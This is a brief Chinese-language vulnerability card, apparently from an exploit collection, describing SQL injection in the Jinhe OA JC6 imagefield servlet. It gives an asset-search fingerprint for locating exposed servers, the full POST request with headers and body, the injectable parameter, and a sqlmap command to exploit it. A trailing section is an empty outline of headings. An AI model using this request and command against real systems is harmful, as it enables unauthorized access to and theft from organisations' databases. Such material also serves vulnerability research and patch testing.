# 金和OAJC6imagefield存在sql注入

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/imagefield HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=8F12D73B0C4B706D7B127A000103A771`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 78`

**请求体 / payload**
```
key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1
sqlmap -r 1.txt -p sKeyvalue
```

**其他**
- 金和OA JC6 imagefield 存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA